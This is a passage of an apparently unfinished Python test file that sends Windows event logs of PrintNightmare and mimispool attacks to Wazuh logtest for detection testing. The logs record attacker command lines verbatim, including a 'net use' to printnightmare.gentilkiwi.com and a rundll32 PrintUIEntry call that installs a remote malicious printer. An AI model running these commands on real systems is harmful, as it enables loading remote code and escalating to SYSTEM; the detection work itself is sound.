import unittest

from internal.logtest import LogtestStatus, send_multiple_logs  # type: ignore


class TestTa0004PrivilegeEscalationT1574DllSideLoading(unittest.TestCase):

    def test_1_print_spool_spawned_a_cmd_shell_printnightmare(self) -> None:
        # Logs extracted from EVTX file
        logs = [
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-Sysmon", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "eventID": "1", "version": "5", "level": "4", "task": "1", "opcode": "0", "keywords": "0x8000000000000000", "systemTime": "2021-10-28T13:41:21.3252459Z", "eventRecordID": "144552", "processID": "1144", "threadID": "1888", "channel": "Microsoft-Windows-Sysmon/Operational", "computer": "FS03.offsec.lan", "severityValue": "INFORMATION", "message": "Process Create:\nRuleName: technique_id=T1059,technique_name=Command-Line Interface\nUtcTime: 2021-10-28 13:41:21.293\nProcessGuid: {7cf65fc7-a881-617a-0605-000000001300}\nProcessId: 3388\nImage: C:\\Windows\\System32\\cmd.exe\nFileVersion: 6.3.9600.17415 (winblue_r4.141028-1500)\nDescription: Windows Command Processor\nProduct: Microsoft\u00ae Windows\u00ae Operating System\nCompany: Microsoft Corporation\nOriginalFileName: Cmd.Exe\nCommandLine: \"cmd.exe\"\nCurrentDirectory: C:\\Windows\\system32\\\nUser: NT AUTHORITY\\SYSTEM\nLogonGuid: {7cf65fc7-7bf5-6176-e703-000000000000}\nLogonId: 0x3E7\nTerminalSessionId: 2\nIntegrityLevel: System\nHashes: SHA1=7C3D7281E1151FE4127923F4B4C3CD36438E1A12,MD5=F5AE03DE0AD60F5B17B82F2CD68402FE,SHA256=6F88FB88FFB0F1D5465C2826E5B4F523598B1B8378377C8378FFEBC171BAD18B,IMPHASH=77AED1ADAF24B344F08C8AD1432908C3\nParentProcessGuid: {7cf65fc7-7bf9-6176-1a00-000000001300}\nParentProcessId: 1048\nParentImage: C:\\Windows\\System32\\spoolsv.exe\nParentCommandLine: C:\\Windows\\System32\\spoolsv.exe\nParentUser: %23"}, "eventdata": {"ruleName": "technique_id=T1059,technique_name=Command-Line Interface", "utcTime": "2021-10-28 13:41:21.293", "processGuid": "{7cf65fc7-a881-617a-0605-000000001300}", "processId": "3388", "image": "C:\\Windows\\System32\\cmd.exe", "fileVersion": "6.3.9600.17415 (winblue_r4.141028-1500)", "description": "Windows Command Processor", "product": "Microsoft\u00ae Windows\u00ae Operating System", "company": "Microsoft Corporation", "originalFileName": "Cmd.Exe", "commandLine": "\"cmd.exe\"", "currentDirectory": "C:\\Windows\\system32\\", "user": "NT AUTHORITY\\SYSTEM", "logonGuid": "{7cf65fc7-7bf5-6176-e703-000000000000}", "logonId": "0x3e7", "terminalSessionId": "2", "integrityLevel": "System", "hashes": "SHA1=7C3D7281E1151FE4127923F4B4C3CD36438E1A12,MD5=F5AE03DE0AD60F5B17B82F2CD68402FE,SHA256=6F88FB88FFB0F1D5465C2826E5B4F523598B1B8378377C8378FFEBC171BAD18B,IMPHASH=77AED1ADAF24B344F08C8AD1432908C3", "parentProcessGuid": "{7cf65fc7-7bf9-6176-1a00-000000001300}", "parentProcessId": "1048", "parentImage": "C:\\Windows\\System32\\spoolsv.exe", "parentCommandLine": "C:\\Windows\\System32\\spoolsv.exe"}}}'''
        ]

        responses = send_multiple_logs(logs, location="stdin", log_format="json")

        # Ensure we receive a response for each log sent
        self.assertEqual(len(responses), len(logs))

        for _, response in enumerate(responses):
            self.assertEqual(response.status, LogtestStatus.RuleMatch)
            self.assertEqual(response.decoder, 'json')

            # Example: Set expected Wazuh rule ID and level when analyzing logs
            # expected_rule_id = None  # Replace with actual rule ID
            # expected_rule_level = None  # Replace with actual rule level

            # self.assertEqual(response.rule_id, expected_rule_id)
            # self.assertEqual(response.rule_level, expected_rule_level)

        # TODO: Write the expected result as test cases when the logs are analyzed by Wazuh.
        self.fail("Test not implemented yet. Define expected results.")

    def test_id316300301316823848_mimispool_printer_server_instal(self) -> None:
        # Logs extracted from EVTX file
        logs = [
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-PrintService", "providerGuid": "{747ef6fd-e535-4d16-b510-42c90f6873a1}", "eventID": "823", "version": "0", "level": "4", "task": "49", "opcode": "11", "keywords": "0x8000000000020000", "systemTime": "2021-10-27T10:09:16.2809298Z", "eventRecordID": "4", "processID": "2552", "threadID": "4012", "channel": "Microsoft-Windows-PrintService/Admin", "computer": "fs03vuln.offsec.lan", "severityValue": "INFORMATION", "message": "The default printer was changed to Kiwi Legit Printer. See the event user data for context information."}, "eventdata": {}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-PrintService", "providerGuid": "{747ef6fd-e535-4d16-b510-42c90f6873a1}", "eventID": "823", "version": "0", "level": "4", "task": "49", "opcode": "11", "keywords": "0x8000000000020000", "systemTime": "2021-10-27T10:12:33.4642419Z", "eventRecordID": "5", "processID": "2992", "threadID": "3944", "channel": "Microsoft-Windows-PrintService/Admin", "computer": "fs03vuln.offsec.lan", "severityValue": "INFORMATION", "message": "The default printer was changed to Microsoft XPS Document Writer (redirected 2),winspool,TS002. See the event user data for context information."}, "eventdata": {}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-PrintService", "providerGuid": "{747ef6fd-e535-4d16-b510-42c90f6873a1}", "eventID": "823", "version": "0", "level": "4", "task": "49", "opcode": "11", "keywords": "0x8000000000020000", "systemTime": "2021-10-27T10:12:47.3235757Z", "eventRecordID": "6", "processID": "2552", "threadID": "2760", "channel": "Microsoft-Windows-PrintService/Admin", "computer": "fs03vuln.offsec.lan", "severityValue": "INFORMATION", "message": "The default printer was changed to Kiwi Legit Printer. See the event user data for context information."}, "eventdata": {}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-PrintService", "providerGuid": "{747ef6fd-e535-4d16-b510-42c90f6873a1}", "eventID": "302", "version": "0", "level": "4", "task": "5", "opcode": "10", "keywords": "0x4000000000000820", "systemTime": "2021-10-27T10:14:21.3699768Z", "eventRecordID": "150", "processID": "2552", "threadID": "4028", "channel": "Microsoft-Windows-PrintService/Operational", "computer": "fs03vuln.offsec.lan", "severityValue": "INFORMATION", "message": "Printer Kiwi Legit Printer will be deleted. No user action is required."}, "eventdata": {}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-PrintService", "providerGuid": "{747ef6fd-e535-4d16-b510-42c90f6873a1}", "eventID": "849", "version": "0", "level": "4", "task": "31", "opcode": "11", "keywords": "0x4000000000000020", "systemTime": "2021-10-27T10:14:21.3699768Z", "eventRecordID": "151", "processID": "2552", "threadID": "4028", "channel": "Microsoft-Windows-PrintService/Operational", "computer": "fs03vuln.offsec.lan", "severityValue": "INFORMATION", "message": "Printer Kiwi Legit Printer shared as Kiwi Legit Printer was unshared by the print spooler."}, "eventdata": {}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-PrintService", "providerGuid": "{747ef6fd-e535-4d16-b510-42c90f6873a1}", "eventID": "301", "version": "0", "level": "4", "task": "5", "opcode": "11", "keywords": "0x4000000000000820", "systemTime": "2021-10-27T10:14:21.3699768Z", "eventRecordID": "152", "processID": "2552", "threadID": "4028", "channel": "Microsoft-Windows-PrintService/Operational", "computer": "fs03vuln.offsec.lan", "severityValue": "INFORMATION", "message": "Printer Kiwi Legit Printer was deleted and users will no longer be able to print to this printer. No user action is required."}, "eventdata": {}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-PrintService", "providerGuid": "{747ef6fd-e535-4d16-b510-42c90f6873a1}", "eventID": "316", "version": "0", "level": "4", "task": "8", "opcode": "11", "keywords": "0x4000000000000900", "systemTime": "2021-10-27T10:14:27.3099495Z", "eventRecordID": "153", "processID": "2552", "threadID": "4028", "channel": "Microsoft-Windows-PrintService/Operational", "computer": "fs03vuln.offsec.lan", "severityValue": "INFORMATION", "message": "Printer driver Generic / Text Only for Windows x64 Version-3 was added or updated. Files:- UNIDRV.DLL, UNIDRVUI.DLL, TTY.GPD, UNIDRV.HLP, TTYRES.DLL, TTY.INI, TTY.DLL, TTYUI.DLL, TTYUI.HLP, UNIRES.DLL, STDNAMES.GPD, STDDTYPE.GDL, STDSCHEM.GDL, STDSCHMX.GDL. No user action is required."}, "eventdata": {}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-PrintService", "providerGuid": "{747ef6fd-e535-4d16-b510-42c90f6873a1}", "eventID": "823", "version": "0", "level": "4", "task": "49", "opcode": "11", "keywords": "0x8000000000020000", "systemTime": "2021-10-27T10:14:27.4036996Z", "eventRecordID": "7", "processID": "2552", "threadID": "4028", "channel": "Microsoft-Windows-PrintService/Admin", "computer": "fs03vuln.offsec.lan", "severityValue": "INFORMATION", "message": "The default printer was changed to Kiwi Legit Printer,winspool,FILE:. See the event user data for context information."}, "eventdata": {}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-PrintService", "providerGuid": "{747ef6fd-e535-4d16-b510-42c90f6873a1}", "eventID": "848", "version": "0", "level": "4", "task": "30", "opcode": "11", "keywords": "0x4000000000000020", "systemTime": "2021-10-27T10:14:27.4662005Z", "eventRecordID": "154", "processID": "2552", "threadID": "4028", "channel": "Microsoft-Windows-PrintService/Operational", "computer": "fs03vuln.offsec.lan", "severityValue": "INFORMATION", "message": "Printer Kiwi Legit Printer was shared by the print spooler as Kiwi Legit Printer."}, "eventdata": {}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-PrintService", "providerGuid": "{747ef6fd-e535-4d16-b510-42c90f6873a1}", "eventID": "823", "version": "0", "level": "4", "task": "49", "opcode": "11", "keywords": "0x8000000000020000", "systemTime": "2021-10-27T10:14:27.5599502Z", "eventRecordID": "8", "processID": "2552", "threadID": "4028", "channel": "Microsoft-Windows-PrintService/Admin", "computer": "fs03vuln.offsec.lan", "severityValue": "INFORMATION", "message": "The default printer was changed to Kiwi Legit Printer. See the event user data for context information."}, "eventdata": {}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-PrintService", "providerGuid": "{747ef6fd-e535-4d16-b510-42c90f6873a1}", "eventID": "300", "version": "0", "level": "4", "task": "4", "opcode": "11", "keywords": "0x4000000000000820", "systemTime": "2021-10-27T10:14:27.5599502Z", "eventRecordID": "155", "processID": "2552", "threadID": "4028", "channel": "Microsoft-Windows-PrintService/Operational", "computer": "fs03vuln.offsec.lan", "severityValue": "INFORMATION", "message": "Printer Kiwi Legit Printer was created. No user action is required."}, "eventdata": {}}}'''
        ]

        responses = send_multiple_logs(logs, location="stdin", log_format="json")

        # Ensure we receive a response for each log sent
        self.assertEqual(len(responses), len(logs))

        for _, response in enumerate(responses):
            self.assertEqual(response.status, LogtestStatus.RuleMatch)
            self.assertEqual(response.decoder, 'json')

            # Example: Set expected Wazuh rule ID and level when analyzing logs
            # expected_rule_id = None  # Replace with actual rule ID
            # expected_rule_level = None  # Replace with actual rule level

            # self.assertEqual(response.rule_id, expected_rule_id)
            # self.assertEqual(response.rule_level, expected_rule_level)

        # TODO: Write the expected result as test cases when the logs are analyzed by Wazuh.
        self.fail("Test not implemented yet. Define expected results.")

    def test_id354_808_mimispool_printer_installation_printnightmare(self) -> None:
        # Logs extracted from EVTX file
        logs = [
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-PrintService", "providerGuid": "{747ef6fd-e535-4d16-b510-42c90f6873a1}", "eventID": "316", "version": "0", "level": "4", "task": "8", "opcode": "11", "keywords": "0x4000000000000900", "systemTime": "2021-10-27T10:28:26.1510830Z", "eventRecordID": "1", "processID": "1048", "threadID": "3836", "channel": "Microsoft-Windows-PrintService/Operational", "computer": "FS03.offsec.lan", "severityValue": "INFORMATION", "message": "Printer driver Generic / Text Only for Windows x64 Version-3 was added or updated. Files:- UNIDRV.DLL, UNIDRVUI.DLL, TTY.GPD, UNIDRV.HLP, TTYRES.DLL, TTY.INI, TTY.DLL, TTYUI.DLL, TTYUI.HLP, UNIRES.DLL, STDNAMES.GPD, STDDTYPE.GDL, STDSCHEM.GDL, STDSCHMX.GDL. No user action is required."}, "eventdata": {}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-PrintService", "providerGuid": "{747ef6fd-e535-4d16-b510-42c90f6873a1}", "eventID": "300", "version": "0", "level": "4", "task": "4", "opcode": "11", "keywords": "0x4000000000000820", "systemTime": "2021-10-27T10:28:26.2292129Z", "eventRecordID": "2", "processID": "1048", "threadID": "3836", "channel": "Microsoft-Windows-PrintService/Operational", "computer": "FS03.offsec.lan", "severityValue": "INFORMATION", "message": "Printer {BABBC1A0-F75A-44B0-92BC-57E20CEDA1D8} was created. No user action is required."}, "eventdata": {}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-PrintService", "providerGuid": "{747ef6fd-e535-4d16-b510-42c90f6873a1}", "eventID": "304", "version": "0", "level": "4", "task": "24", "opcode": "11", "keywords": "0x4000000000000820", "systemTime": "2021-10-27T10:28:26.2292129Z", "eventRecordID": "3", "processID": "1048", "threadID": "3836", "channel": "Microsoft-Windows-PrintService/Operational", "computer": "FS03.offsec.lan", "severityValue": "INFORMATION", "message": "Printer {BABBC1A0-F75A-44B0-92BC-57E20CEDA1D8} was resumed. No user action is required."}, "eventdata": {}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-PrintService", "providerGuid": "{747ef6fd-e535-4d16-b510-42c90f6873a1}", "eventID": "306", "version": "0", "level": "4", "task": "17", "opcode": "11", "keywords": "0x4000000000000820", "systemTime": "2021-10-27T10:28:26.2292129Z", "eventRecordID": "4", "processID": "1048", "threadID": "3836", "channel": "Microsoft-Windows-PrintService/Operational", "computer": "FS03.offsec.lan", "severityValue": "INFORMATION", "message": "Settings for printer {BABBC1A0-F75A-44B0-92BC-57E20CEDA1D8} were changed. No user action is required."}, "eventdata": {}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-PrintService", "providerGuid": "{747ef6fd-e535-4d16-b510-42c90f6873a1}", "eventID": "306", "version": "0", "level": "4", "task": "17", "opcode": "11", "keywords": "0x4000000000000820", "systemTime": "2021-10-27T10:28:26.2448345Z", "eventRecordID": "5", "processID": "1048", "threadID": "3836", "channel": "Microsoft-Windows-PrintService/Operational", "computer": "FS03.offsec.lan", "severityValue": "INFORMATION", "message": "Settings for printer {BABBC1A0-F75A-44B0-92BC-57E20CEDA1D8} were changed. No user action is required."}, "eventdata": {}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-PrintService", "providerGuid": "{747ef6fd-e535-4d16-b510-42c90f6873a1}", "eventID": "354", "version": "0", "level": "2", "task": "36", "opcode": "12", "keywords": "0x8000000000000800", "systemTime": "2021-10-27T10:28:26.2604608Z", "eventRecordID": "10", "processID": "1048", "threadID": "3836", "channel": "Microsoft-Windows-PrintService/Admin", "computer": "FS03.offsec.lan", "severityValue": "ERROR", "message": "\\\\fs03vuln\\Kiwi Legit Printer initialisation failed at \\\\fs03vuln\\print$\\W32X86\\3\\mimispool.dll. Error: 2. The system cannot find the file specified.\n. This can occur because of system instability or a lack of system resources."}, "eventdata": {}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-PrintService", "providerGuid": "{747ef6fd-e535-4d16-b510-42c90f6873a1}", "eventID": "306", "version": "0", "level": "4", "task": "17", "opcode": "11", "keywords": "0x4000000000000820", "systemTime": "2021-10-27T10:28:26.2604608Z", "eventRecordID": "6", "processID": "1048", "threadID": "3836", "channel": "Microsoft-Windows-PrintService/Operational", "computer": "FS03.offsec.lan", "severityValue": "INFORMATION", "message": "Settings for printer {BABBC1A0-F75A-44B0-92BC-57E20CEDA1D8} were changed. No user action is required."}, "eventdata": {}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-PrintService", "providerGuid": "{747ef6fd-e535-4d16-b510-42c90f6873a1}", "eventID": "823", "version": "0", "level": "4", "task": "49", "opcode": "11", "keywords": "0x8000000000020000", "systemTime": "2021-10-27T10:28:26.3073368Z", "eventRecordID": "11", "processID": "1048", "threadID": "3836", "channel": "Microsoft-Windows-PrintService/Admin", "computer": "FS03.offsec.lan", "severityValue": "INFORMATION", "message": "The default printer was changed to \\\\fs03vuln\\Kiwi Legit Printer. See the event user data for context information."}, "eventdata": {}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-PrintService", "providerGuid": "{747ef6fd-e535-4d16-b510-42c90f6873a1}", "eventID": "808", "version": "0", "level": "2", "task": "36", "opcode": "12", "keywords": "0x8000000000020000", "systemTime": "2021-10-27T10:28:26.3229603Z", "eventRecordID": "12", "processID": "1656", "threadID": "1572", "channel": "Microsoft-Windows-PrintService/Admin", "computer": "FS03.offsec.lan", "severityValue": "ERROR", "message": "The print spooler failed to load a plug-in module C:\\Windows\\system32\\spool\\DRIVERS\\x64\\3mimispool.dll, error code 0x7E. See the event user data for context information."}, "eventdata": {}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-PrintService", "providerGuid": "{747ef6fd-e535-4d16-b510-42c90f6873a1}", "eventID": "808", "version": "0", "level": "2", "task": "36", "opcode": "12", "keywords": "0x8000000000020000", "systemTime": "2021-10-27T10:28:26.4167141Z", "eventRecordID": "13", "processID": "1656", "threadID": "1572", "channel": "Microsoft-Windows-PrintService/Admin", "computer": "FS03.offsec.lan", "severityValue": "ERROR", "message": "The print spooler failed to load a plug-in module C:\\Windows\\system32\\spool\\DRIVERS\\x64\\3mimispool.dll, error code 0x7E. See the event user data for context information."}, "eventdata": {}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-PrintService", "providerGuid": "{747ef6fd-e535-4d16-b510-42c90f6873a1}", "eventID": "302", "version": "0", "level": "4", "task": "5", "opcode": "10", "keywords": "0x4000000000000820", "systemTime": "2021-10-27T10:28:26.4323372Z", "eventRecordID": "7", "processID": "1048", "threadID": "2496", "channel": "Microsoft-Windows-PrintService/Operational", "computer": "FS03.offsec.lan", "severityValue": "INFORMATION", "message": "Printer {BABBC1A0-F75A-44B0-92BC-57E20CEDA1D8} will be deleted. No user action is required."}, "eventdata": {}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-PrintService", "providerGuid": "{747ef6fd-e535-4d16-b510-42c90f6873a1}", "eventID": "302", "version": "0", "level": "4", "task": "5", "opcode": "10", "keywords": "0x4000000000000820", "systemTime": "2021-10-27T10:28:26.4635878Z", "eventRecordID": "8", "processID": "1048", "threadID": "2496", "channel": "Microsoft-Windows-PrintService/Operational", "computer": "FS03.offsec.lan", "severityValue": "INFORMATION", "message": "Printer {BABBC1A0-F75A-44B0-92BC-57E20CEDA1D8},1 will be deleted. No user action is required."}, "eventdata": {}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-PrintService", "providerGuid": "{747ef6fd-e535-4d16-b510-42c90f6873a1}", "eventID": "301", "version": "0", "level": "4", "task": "5", "opcode": "11", "keywords": "0x4000000000000820", "systemTime": "2021-10-27T10:28:26.4635878Z", "eventRecordID": "9", "processID": "1048", "threadID": "2496", "channel": "Microsoft-Windows-PrintService/Operational", "computer": "FS03.offsec.lan", "severityValue": "INFORMATION", "message": "Printer {BABBC1A0-F75A-44B0-92BC-57E20CEDA1D8} was deleted and users will no longer be able to print to this printer. No user action is required."}, "eventdata": {}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-PrintService", "providerGuid": "{747ef6fd-e535-4d16-b510-42c90f6873a1}", "eventID": "317", "version": "0", "level": "4", "task": "9", "opcode": "11", "keywords": "0x4000000000000900", "systemTime": "2021-10-27T10:28:26.4948380Z", "eventRecordID": "10", "processID": "1048", "threadID": "3768", "channel": "Microsoft-Windows-PrintService/Operational", "computer": "FS03.offsec.lan", "severityValue": "INFORMATION", "message": "Printer driver Generic / Text Only was deleted. No user action is required."}, "eventdata": {}}}'''
        ]

        responses = send_multiple_logs(logs, location="stdin", log_format="json")

        # Ensure we receive a response for each log sent
        self.assertEqual(len(responses), len(logs))

        for _, response in enumerate(responses):
            self.assertEqual(response.status, LogtestStatus.RuleMatch)
            self.assertEqual(response.decoder, 'json')

            # Example: Set expected Wazuh rule ID and level when analyzing logs
            # expected_rule_id = None  # Replace with actual rule ID
            # expected_rule_level = None  # Replace with actual rule level

            # self.assertEqual(response.rule_id, expected_rule_id)
            # self.assertEqual(response.rule_level, expected_rule_level)

        # TODO: Write the expected result as test cases when the logs are analyzed by Wazuh.
        self.fail("Test not implemented yet. Define expected results.")

    def test_id468864164648_systemnightmare(self) -> None:
        # Logs extracted from EVTX file
        logs = [
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-Eventlog", "providerGuid": "{fc65ddd8-d6ef-4962-83d5-6e5cfe9ce148}", "eventID": "1102", "version": "0", "level": "4", "task": "104", "opcode": "0", "keywords": "0x4020000000000000", "systemTime": "2021-10-08T12:56:58.8038610Z", "eventRecordID": "2183518", "processID": "940", "threadID": "1040", "channel": "Security", "computer": "fs01.offsec.lan", "severityValue": "INFORMATION", "message": "The audit log was cleared.\nSubject:\n\tSecurity ID:\tS-1-5-21-4230534742-2542757381-3142984815-1111\n\tAccount Name:\tadmmig\n\tDomain Name:\tOFFSEC\n\tLogon ID:\t0x65B0F5DB"}, "eventdata": {}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-Security-Auditing", "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}", "eventID": "4688", "version": "2", "level": "0", "task": "13312", "opcode": "0", "keywords": "0x8020000000000000", "systemTime": "2021-10-08T12:57:04.5040088Z", "eventRecordID": "2183519", "processID": "4", "threadID": "6208", "channel": "Security", "computer": "fs01.offsec.lan", "severityValue": "AUDIT_SUCCESS", "message": "A new process has been created.\n\nCreator Subject:\n\tSecurity ID:\t\tS-1-5-21-4230534742-2542757381-3142984815-1111\n\tAccount Name:\t\tadmmig\n\tAccount Domain:\t\tOFFSEC\n\tLogon ID:\t\t0x65B0F5DB\n\nTarget Subject:\n\tSecurity ID:\t\tS-1-0-0\n\tAccount Name:\t\t-\n\tAccount Domain:\t\t-\n\tLogon ID:\t\t0x0\n\nProcess Information:\n\tNew Process ID:\t\t0x10a4\n\tNew Process Name:\tC:\\Windows\\System32\\net.exe\n\tToken Elevation Type:\t%%1937\n\tMandatory Label:\t\tS-1-16-12288\n\tCreator Process ID:\t0x7d8\n\tCreator Process Name:\tC:\\Windows\\System32\\cmd.exe\n\tProcess Command Line:\tnet  use \\\\printnightmare.gentilkiwi.com\\ipc$ /user:gentilguest password\n\nToken Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.\n\nType 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.\n\nType 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.\n\nType 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."}, "eventdata": {"subjectUserSid": "S-1-5-21-4230534742-2542757381-3142984815-1111", "subjectUserName": "admmig", "subjectDomainName": "OFFSEC", "subjectLogonId": "0x65b0f5db", "newProcessId": "0x10a4", "newProcessName": "C:\\Windows\\System32\\net.exe", "tokenElevationType": "%%1937", "processId": "0x7d8", "commandLine": "net  use \\\\printnightmare.gentilkiwi.com\\ipc$ /user:gentilguest password", "targetUserSid": "S-1-0-0", "targetLogonId": "0x0", "parentProcessName": "C:\\Windows\\System32\\cmd.exe", "mandatoryLabel": "S-1-16-12288"}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-Security-Auditing", "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}", "eventID": "4648", "version": "0", "level": "0", "task": "12544", "opcode": "0", "keywords": "0x8020000000000000", "systemTime": "2021-10-08T12:57:06.7635761Z", "eventRecordID": "2183520", "processID": "556", "threadID": "7540", "channel": "Security", "computer": "fs01.offsec.lan", "severityValue": "AUDIT_SUCCESS", "message": "A logon was attempted using explicit credentials.\n\nSubject:\n\tSecurity ID:\t\tS-1-5-21-4230534742-2542757381-3142984815-1111\n\tAccount Name:\t\tadmmig\n\tAccount Domain:\t\tOFFSEC\n\tLogon ID:\t\t0x65B0F5DB\n\tLogon GUID:\t\t{430ada27-e2ab-e393-2b26-48818c7968d4}\n\nAccount Whose Credentials Were Used:\n\tAccount Name:\t\tgentilguest\n\tAccount Domain:\t\tOFFSEC\n\tLogon GUID:\t\t{00000000-0000-0000-0000-000000000000}\n\nTarget Server:\n\tTarget Server Name:\tprintnightmare.gentilkiwi.com\n\tAdditional Information:\tprintnightmare.gentilkiwi.com\n\nProcess Information:\n\tProcess ID:\t\t0x4\n\tProcess Name:\t\t\n\nNetwork Information:\n\tNetwork Address:\t20.188.56.147\n\tPort:\t\t\t445\n\nThis event is generated when a process attempts to log on an account by explicitly specifying that account\u2019s credentials.  This most commonly occurs in batch-type configurations such as scheduled tasks, or when using the RUNAS command."}, "eventdata": {"subjectUserSid": "S-1-5-21-4230534742-2542757381-3142984815-1111", "subjectUserName": "admmig", "subjectDomainName": "OFFSEC", "subjectLogonId": "0x65b0f5db", "logonGuid": "{430ada27-e2ab-e393-2b26-48818c7968d4}", "targetUserName": "gentilguest", "targetDomainName": "OFFSEC", "targetLogonGuid": "{00000000-0000-0000-0000-000000000000}", "targetServerName": "printnightmare.gentilkiwi.com", "targetInfo": "printnightmare.gentilkiwi.com", "processId": "0x4", "ipAddress": "20.188.56.147", "ipPort": "445"}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-Security-Auditing", "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}", "eventID": "4688", "version": "2", "level": "0", "task": "13312", "opcode": "0", "keywords": "0x8020000000000000", "systemTime": "2021-10-08T12:57:06.8690575Z", "eventRecordID": "2183521", "processID": "4", "threadID": "6208", "channel": "Security", "computer": "fs01.offsec.lan", "severityValue": "AUDIT_SUCCESS", "message": "A new process has been created.\n\nCreator Subject:\n\tSecurity ID:\t\tS-1-5-21-4230534742-2542757381-3142984815-1111\n\tAccount Name:\t\tadmmig\n\tAccount Domain:\t\tOFFSEC\n\tLogon ID:\t\t0x65B0F5DB\n\nTarget Subject:\n\tSecurity ID:\t\tS-1-0-0\n\tAccount Name:\t\t-\n\tAccount Domain:\t\t-\n\tLogon ID:\t\t0x0\n\nProcess Information:\n\tNew Process ID:\t\t0x1670\n\tNew Process Name:\tC:\\Windows\\System32\\rundll32.exe\n\tToken Elevation Type:\t%%1937\n\tMandatory Label:\t\tS-1-16-12288\n\tCreator Process ID:\t0x7d8\n\tCreator Process Name:\tC:\\Windows\\System32\\cmd.exe\n\tProcess Command Line:\trundll32  printui.dll,PrintUIEntry /in /n\"\\\\printnightmare.gentilkiwi.com\\Kiwi Legit Printer\"\n\nToken Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.\n\nType 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.\n\nType 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.\n\nType 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator."}, "eventdata": {"subjectUserSid": "S-1-5-21-4230534742-2542757381-3142984815-1111", "subjectUserName": "admmig", "subjectDomainName": "OFFSEC", "subjectLogonId": "0x65b0f5db", "newProcessId": "0x1670", "newProcessName": "C:\\Windows\\System32\\rundll32.exe", "tokenElevationType": "%%1937", "processId": "0x7d8", "commandLine": "rundll32  printui.dll,PrintUIEntry /in /n\"\\\\printnightmare.gentilkiwi.com\\Kiwi Legit Printer\"", "targetUserSid": "S-1-0-0", "targetLogonId": "0x0", "parentProcessName": "C:\\Windows\\System32\\cmd.exe", "mandatoryLabel": "S-1-16-12288"}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-Security-Auditing", "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}", "eventID": "4690", "version": "0", "level": "0", "task": "12807", "opcode": "0", "keywords": "0x8020000000000000", "systemTime": "2021-10-08T12:57:12.8425776Z", "eventRecordID": "2183522", "processID": "4", "threadID": "4756", "channel": "Security", "computer": "fs01.offsec.lan", "severityValue": "AUDIT_SUCCESS", "message": "An attempt was made to duplicate a handle to an object.\n\nSubject:\n\tSecurity ID:\t\tS-1-5-21-4230534742-2542757381-3142984815-1111\n\tAccount Name:\t\tadmmig\n\tAccount Domain:\t\tOFFSEC\n\tLogon ID:\t\t0x65B0F5DB\n\nSource Handle Information:\n\tSource Handle ID:\t0xaf8\n\tSource Process ID:\t0x678\n\nNew Handle Information:\n\tTarget Handle ID:\t0x1748\n\tTarget Process ID:\t0x4"}, "eventdata": {"subjectUserSid": "S-1-5-21-4230534742-2542757381-3142984815-1111", "subjectUserName": "admmig", "subjectDomainName": "OFFSEC", "subjectLogonId": "0x65b0f5db", "sourceHandleId": "0xaf8", "sourceProcessId": "0x678", "targetHandleId": "0x1748", "targetProcessId": "0x4"}}}''',
